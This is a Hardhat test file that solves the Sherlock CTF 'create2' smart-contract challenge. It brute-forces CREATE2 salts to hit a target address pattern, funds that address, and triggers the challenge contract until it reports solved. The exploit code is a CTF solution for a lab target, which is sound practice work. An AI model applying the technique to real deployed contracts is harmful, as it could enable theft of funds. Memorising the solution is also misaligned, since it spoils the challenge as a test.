import chai, { expect } from "chai";
import { ethers } from "hardhat";
import { solidity } from "ethereum-waffle";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { Setup, Challenge } from "../types";

chai.use(solidity);

describe("Sherlock CTF: create2", () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  let setup: Setup;
  let challenge: Challenge;
  let factory_address: string;

  beforeEach(async () => {
    [deployer, attacker] = await ethers.getSigners();

    const SetupFactory = await ethers.getContractFactory("Setup", deployer);
    setup = await SetupFactory.deploy();

    factory_address = await setup.factory();
    const challenge_address = await setup.challenge();
    challenge = await ethers.getContractAt("Challenge", challenge_address, deployer);
  });

  it("Exploit - on-chain", async () => {
    expect(factory_address).equals("0xa16E02E87b7454126E5E10d957A927A7F5B5d2be");
    await attacker.sendTransaction({
      to: "0x028430f8E3A173D03F0470009DB90EF0b1Dc9461",
      value: ethers.utils.parseEther("0.1"),
    });
    const ExploitFactory = await ethers.getContractFactory("Exploit", attacker);
    await ExploitFactory.deploy(challenge.address, setup.address);
  });

  it("Exploit - off-chain", async () => {
    const DummyFactory = await ethers.getContractFactory("Dummy");
    const init_code = DummyFactory.bytecode;
    const init_code_hash = ethers.utils.keccak256(init_code);

    let computed_address_off_chain = "";
    let salt = "";
    const start = Date.now();
    for (let i = 1; i < 1_000_000_000; i++) {
      if (i % 10_000 == 0) {
        console.log("i = ", i);
      }
      salt = ethers.utils.formatBytes32String(String(i));
      computed_address_off_chain = ethers.utils.getCreate2Address(factory_address, salt, init_code_hash);
      if (computed_address_off_chain.toLowerCase().includes("f0b1d")) {
        console.log(`Tries ${i}`);
        console.log(`Salt ${salt}`);
        console.log(`computed address off chain = ${computed_address_off_chain}`);
        console.log(`Elapsed ${Date.now() - start}`);
        break;
      }
    }

    // Attack
    await attacker.sendTransaction({
      to: computed_address_off_chain,
      value: ethers.utils.parseEther("0.1"),
    });
    await challenge.connect(attacker).createContract(init_code, salt);
  });



  afterEach(async () => {
    expect(await setup.isSolved()).to.be.true;
  });
});
